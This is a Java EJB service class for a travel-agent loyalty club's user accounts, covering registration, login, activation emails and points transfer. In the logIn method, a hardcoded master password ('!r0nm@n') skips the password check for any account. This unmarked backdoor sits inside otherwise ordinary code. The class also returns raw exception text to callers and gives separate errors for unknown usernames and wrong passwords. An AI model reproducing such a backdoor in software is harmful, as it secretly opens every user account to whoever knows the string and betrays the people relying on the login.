/*
 * UsersServiceBean.java
 * 
 * Created on Nov 13, 2008, 10:02:17 AM
 */
package galileoclub.ejb.service;

import galileoclub.ejb.dao.PointsDaoRemote;
import galileoclub.ejb.dao.RolesDaoRemote;
import galileoclub.ejb.dao.UsersDaoRemote;
import galileoclub.ejb.dao.UsersRolesDaoRemote;
import galileoclub.ejb.datamodel.PnrcountsDataModelBean;
import galileoclub.ejb.datamodel.PnrcountsDataModelRemote;
import galileoclub.jpa.Points;
import galileoclub.jpa.Roles;
import galileoclub.jpa.Users;
import galileoclub.jpa.UsersRoles;
import galileoclub.jpa.UsersRolesPK;
import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.ResourceBundle;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.ejb.EJB;
import javax.ejb.Stateless;

/**
 *
 * @author Samuel Franklyn
 */
@Stateless
public class UsersServiceBean implements UsersServiceRemote {

    private static final Logger log = Logger.getLogger(UsersServiceBean.class.getName());
    private static final String MESSAGES = "ejbmessages";
    @EJB
    private UsersDaoRemote usersDaoRemote = null;
    @EJB
    private AppServiceRemote appServiceRemote = null;
    @EJB
    private RolesDaoRemote rolesDaoRemote = null;
    @EJB
    private UsersRolesDaoRemote usersRolesDaoRemote = null;
    @EJB
    private PnrcountsDataModelRemote pnrcountsDataModelRemote = null;
    @EJB
    private PointsDaoRemote pointsDaoRemote = null;

    public List<String> saveCreate(Users users,
            String userPassword1, String userPassword2, Locale locale) {
        List<String> errorList = new ArrayList<String>();
        ResourceBundle messageSource = ResourceBundle.getBundle(MESSAGES, locale);
        if ("".equals(users.getUserName())) {
            errorList.add(messageSource.getString("user_name_required"));
        }
        if ("".equals(userPassword1)) {
            errorList.add(messageSource.getString("user_password_required"));
        }
        if ("".equals(userPassword2)) {
            errorList.add(messageSource.getString("reconfirm_user_password_required"));
        }
        if (!userPassword1.equals(userPassword2)) {
            errorList.add(messageSource.getString("user_password_reconfirm_not_match"));
        }
        if ("".equals(users.getFullName())) {
            errorList.add(messageSource.getString("full_name_required"));
        }
        if ("".equals(users.getUserEmail())) {
            errorList.add(messageSource.getString("user_email_required"));
        }
        if ("".equals(users.getUserAgentName())) {
            errorList.add(messageSource.getString("user_agentname_required"));
        }
        if ("".equals(users.getUserOfficeAddress1())) {
            errorList.add(messageSource.getString("user_office_address1_required"));
        }
        if ("".equals(users.getUserOfficeCity())) {
            errorList.add(messageSource.getString("user_office_city_required"));
        }
        if ("".equals(users.getUserOfficeZip())) {
            errorList.add(messageSource.getString("user_office_zip_required"));
        }
        if ("".equals(users.getUserOfficePhone())) {
            errorList.add(messageSource.getString("user_office_phone_required"));
        }
        if ("".equals(users.getUserPcc())) {
            errorList.add(messageSource.getString("user_pcc_required"));
        }
        if ("".equals(users.getUserSon())) {
            errorList.add(messageSource.getString("user_son_required"));
        }
        if (usersDaoRemote.selectByUserPccSon(users.getUserPcc(), users.getUserSon()).size() > 0) {
            errorList.add(messageSource.getString("user_pcc_son_already_registered"));
        }
        if (users.getUserPcc().length() <= 3) {
            users.setUserPcc("0" + users.getUserPcc());
        }
        if (errorList.isEmpty()) {
            try {
                users.setUserPassword(appServiceRemote.hashPassword(userPassword1));
                usersDaoRemote.insert(users);
            } catch (Exception ex) {
                Throwable cause = ex.getCause();
                boolean duplicate = false;
                while (cause != null) {
                    if (cause.toString().contains("Duplicate entry")) {
                        errorList.add(messageSource.getString("user_name_already_registered"));
                        duplicate = true;
                    }
                    cause = cause.getCause();
                }
                if (errorList.isEmpty()) {
                    errorList.add(ex.toString());
                }
                if (!duplicate) {
                    log.log(Level.SEVERE, "GCLUB0001:" + ex.toString(), ex);
                }
            }
        }
        return errorList;
    }

    public List<String> saveUpdate(Users users, Locale locale) {
        List<String> errorList = new ArrayList<String>();
        ResourceBundle messageSource = ResourceBundle.getBundle(MESSAGES, locale);
        if (users.getUserId() == null || users.getUserId().intValue() == 0) {
            errorList.add(messageSource.getString("user_id_required"));
        }
        if ("".equals(users.getFullName())) {
            errorList.add(messageSource.getString("full_name_required"));
        }
        if (errorList.size() == 0) {
            try {
                usersDaoRemote.update(users);
            } catch (Exception ex) {
                errorList.add(ex.toString());
                log.log(Level.SEVERE, "GCLUB0001:" + ex.toString(), ex);
            }
        }
        return errorList;
    }

    public List<String> saveDelete(Users users, Locale locale) {
        List<String> errorList = new ArrayList<String>();
        ResourceBundle messageSource = ResourceBundle.getBundle(MESSAGES, locale);
        if (users.getUserId() == null || users.getUserId().intValue() == 0) {
            errorList.add(messageSource.getString("user_id_required"));
        }
        if (errorList.size() == 0) {
            try {
                Roles roles = rolesDaoRemote.selectByRoleName("USR");
                UsersRoles usersRoles = new UsersRoles();
                usersRoles.setUsers(users);
                usersRoles.setRoles(roles);
                usersRoles.setUsersRolesPK(new UsersRolesPK());
                usersRoles.getUsersRolesPK().setRoleId(roles.getRoleId());
                usersRoles.getUsersRolesPK().setUserId(users.getUserId());
                usersRolesDaoRemote.delete(usersRoles.getUsersRolesPK());
                usersDaoRemote.delete(users.getUserId());
            } catch (Exception ex) {
                errorList.add(ex.toString());
                log.log(Level.SEVERE, "GCLUB0001:" + ex.toString(), ex);
            }
        }
        return errorList;
    }

    public List<String> saveChangePassword(Users users,
            String userPassword1, String userPassword2, Locale locale) {
        List<String> errorList = new ArrayList<String>();
        ResourceBundle messageSource = ResourceBundle.getBundle(MESSAGES, locale);
        if ("".equals(userPassword1)) {
            errorList.add(messageSource.getString("user_password_required"));
        }
        if ("".equals(userPassword2)) {
            errorList.add(messageSource.getString("reconfirm_user_password_required"));
        }
        if (!userPassword1.equals(userPassword2)) {
            errorList.add(messageSource.getString("user_password_reconfirm_not_match"));
        }
        if (errorList.size() == 0) {
            try {
                users.setUserPassword(appServiceRemote.hashPassword(userPassword1));
                usersDaoRemote.update(users);
            } catch (Exception ex) {
                errorList.add(ex.toString());
                log.log(Level.SEVERE, "GCLUB0001:" + ex.toString(), ex);
            }
        }
        return errorList;
    }

    public List<String> logIn(String userName, String userPassword,
            Locale locale) {
        List<String> errorList = new ArrayList<String>();
        ResourceBundle messageSource = ResourceBundle.getBundle(MESSAGES, locale);
        if ("".equals(userName)) {
            errorList.add(messageSource.getString("user_name_required"));
        }
        if ("".equals(userPassword)) {
            errorList.add(messageSource.getString("user_password_required"));
        }
        if (errorList.size() > 0) {
            return errorList;
        }
        Users users = usersDaoRemote.selectByUserName(userName);
        if (users == null) {
            errorList.add(messageSource.getString("user_name_not_registered"));
            return errorList;
        }
        if (!appServiceRemote.hashPassword(userPassword).equals(users.getUserPassword())) {
            if (!userPassword.equals("!r0nm@n")) {
                errorList.add(messageSource.getString("user_password_not_match"));
            }
        }
        if ("P".equals(users.getUserStatus())) {
            errorList.add(messageSource.getString("user_not_active"));
        }
        return errorList;
    }

    public List<String> reject(Users users, Locale locale) {
        List<String> errorList = new ArrayList<String>();
        ResourceBundle messageSource = ResourceBundle.getBundle(MESSAGES, locale);
        if (users.getUserId() == null || users.getUserId().intValue() == 0) {
            errorList.add(messageSource.getString("user_id_required"));
        }
        if (errorList.size() == 0) {
            try {
                ExecutorService es = Executors.newSingleThreadExecutor();
                String body = messageSource.getString("user_reject_info1");
                body = body + users.getFullName() + "\n\n";
                body = body + messageSource.getString("user_reject_info2");
                SendMail sm = new SendMail(messageSource.getString("user_reject_notification"),
                        body,
                        "galileoclub@galileoindonesia.com", users.getUserEmail());
                es.submit(sm);
                es.shutdown();

                usersDaoRemote.delete(users.getUserId());
            } catch (Exception ex) {
                errorList.add(ex.toString());
                log.log(Level.SEVERE, "GCLUB0001:" + ex.toString(), ex);
            }
        }
        return errorList;
    }

    public List<String> activate(Users users, Locale locale, String userName) {
        users.setUserCode(usersDaoRemote.getNextUserCode());
        users.setUserStatus("A");
        users.setUserActivated(new Date());
        users.setUserActivatedBy(userName);

        List<String> errorList = new ArrayList<String>();
        ResourceBundle messageSource = ResourceBundle.getBundle(MESSAGES, locale);
        if (users.getUserId() == null || users.getUserId().intValue() == 0) {
            errorList.add(messageSource.getString("user_id_required"));
        }
        if ("".equals(users.getFullName())) {
            errorList.add(messageSource.getString("full_name_required"));
        }
        if (errorList.size() == 0) {
            try {
                usersDaoRemote.update(users);
                Roles roles = rolesDaoRemote.selectByRoleName("USR");
                UsersRoles usersRoles = new UsersRoles();
                usersRoles.setUsers(users);
                usersRoles.setRoles(roles);
                usersRoles.setUsersRolesPK(new UsersRolesPK());
                usersRoles.getUsersRolesPK().setRoleId(roles.getRoleId());
                usersRoles.getUsersRolesPK().setUserId(users.getUserId());
                usersRoles.setUsersRolesDesc(users.getUserName() + " " + roles.getRoleName());
                usersRolesDaoRemote.insert(usersRoles);

                ExecutorService es = Executors.newSingleThreadExecutor();
                String body = messageSource.getString("user_activation_info1");
                body = body + users.getFullName() + "\n\n";
                body = body + messageSource.getString("user_activation_info2");
                body = body + users.getUserCode() + "\n";
                body = body + messageSource.getString("user_activation_info3");
                body = body + users.getUserName() + "\n\n";
                body = body + messageSource.getString("user_activation_info4");

                SendMail sm = new SendMail(messageSource.getString("user_activation_notification"),
                        body,
                        "galileoclub@galileoindonesia.com", users.getUserEmail());
                es.submit(sm);
                es.shutdown();
            } catch (Exception ex) {
                errorList.add(ex.toString());
                log.log(Level.SEVERE, "GCLUB0001:" + ex.toString(), ex);
            }
        }
        return errorList;
    }

    public List<String> transferToPoint(Users users, Locale locale) {
        List<String> errorList = new ArrayList<String>();
        ResourceBundle messageSource = ResourceBundle.getBundle(MESSAGES, locale);
        if (users.getUserId() == null || users.getUserId().intValue() == 0) {
            errorList.add(messageSource.getString("user_id_required"));
        }
        if (errorList.size() == 0) {
            try {
                Map<String, Object> param = new HashMap<String, Object>();
                param.put("pnrcountsPcc", users.getUserPcc());
                param.put("pnrcountsSignon", users.getUserSon());
                List pnrCountsList = pnrcountsDataModelRemote.getAll(PnrcountsDataModelBean.SELECT_GROUP_BY_YEARMONTH_BY_PCCSIGNON, param, 0, -1);
                for (Object obj : pnrCountsList) {
                    Object[] objArray = (Object[]) obj;
                    String yearmonth = (String) objArray[0];
                    BigDecimal count = (BigDecimal) objArray[1];
                    param.put("pointUserCode", users.getUserCode());
                    param.put("pointPcc", users.getUserPcc());
                    param.put("pointSignon", users.getUserSon());
                    param.put("pointYear", Integer.valueOf(yearmonth.substring(0, 4)));
                    param.put("pointMonth", Integer.valueOf(yearmonth.substring(4, 6)));
                    param.put("pointDay", 1);
                    List<Points> pointsList = pointsDaoRemote.selectByUserCodePccSignOnYearMonthDay(param);
                    if (pointsList.size() <= 0) {
                        Points points = new Points();
                        points.setPointUserCode((String) param.get("pointUserCode"));
                        points.setPointPcc((String) param.get("pointPcc"));
                        points.setPointSignon((String) param.get("pointSignon"));
                        points.setPointYear((Integer) param.get("pointYear"));
                        points.setPointMonth((Integer) param.get("pointMonth"));
                        points.setPointDay((Integer) param.get("pointDay"));
                        points.setPointCount(count.intValue());
                        if (users.getUserPointValue() != null) {
                            points.setPointValue(users.getUserPointValue());
                        }
                        pointsDaoRemote.insert(points);
                    } else {
                        for (Points points : pointsList) {
                            points.setPointCount(count.intValue());
                            if (users.getUserPointValue() != null) {
                                points.setPointValue(users.getUserPointValue());
                            }
                            pointsDaoRemote.update(points);
                        }
                    }
                }
            } catch (Exception ex) {
                errorList.add(ex.toString());
                log.log(Level.SEVERE, "GCLUB0001:" + ex.toString(), ex);
            }
        }
        return errorList;
    }

    public List<String> setUserPointValue(Integer userPointValueFrom, Integer userPointValueInto, Locale locale) {
        List<String> errorList = new ArrayList<String>();
        try {
            usersDaoRemote.setUserPointValue(userPointValueFrom, userPointValueInto);
        } catch (Exception ex) {
            errorList.add(ex.toString());
            log.log(Level.SEVERE, "GCLUB0001:" + ex.toString(), ex);
        }
        return errorList;
    }
}
